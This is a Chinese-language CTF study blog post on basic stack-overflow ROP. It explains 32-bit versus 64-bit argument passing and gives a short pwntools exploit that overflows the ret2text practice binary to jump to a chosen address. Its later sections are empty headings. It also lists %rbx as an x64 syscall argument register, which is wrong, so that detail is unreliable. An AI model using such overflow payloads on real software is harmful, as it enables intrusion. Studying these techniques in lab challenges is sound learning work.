---
title: Pwn入门 - Part III Stack Overflow实战(CTFWIKI)
date: 2022-1-9 14:09:00 +0800
author: sirius
categories: [CTF]
tags: [CTF, pwn]
math: false
typora-root-url: ../../SiriusHsh.github.io
typora-copy-images-to: ../assets/img/2022
---

##  CTF wiki

## 基本ROP

CTF wiki上的题目都是32位的，32位的和64位的区别在于

> **函数参数**
>
> - X86
>
>   - 函数的参数放在栈上，在函数返回地址的上方
>
>     ![image-20220109222121679](/assets/img/2022/image-20220109222121679.png){: .normal}
>
>     就像这样调用gets前，将参数（这里是待赋值的变量的地址）压入栈（放在esp上）
>
> - x64
>
>   - 函数的前6个参数放在寄存器里，其余的才会放在栈上

> **系统调用**
>
> - x86
>   - 寄存器： %eax, arg0(%ebx), arg1(%ecx), arg2(%edx)  .etc
>   - 系统调用 int 0x80
> - x64
>   - 寄存器：%rax, arg0(%rdi), arg1(%rsi), arg2(%rbx)   .etc
>   - 系统调用 syscall

### # ret2text

通过debug一下

![image-20220109225355822](/assets/img/2022/image-20220109225355822.png)

可以看到，实际上s相较于ebp的偏移是0x6c个字节。

![image-20220109225923257](/assets/img/2022/image-20220109225923257.png)

exp:

```python
from pwn import *

r = process('./ret2text')

magic_addr = 0x804863A
r.recvuntil('anything?\n')
p = 'a'*(0x6c+0x4)+p32(magic_addr)
r.sendline(p)

r.interactive()
```

### # ret2shellcode



## 中级ROP



## 高级ROP

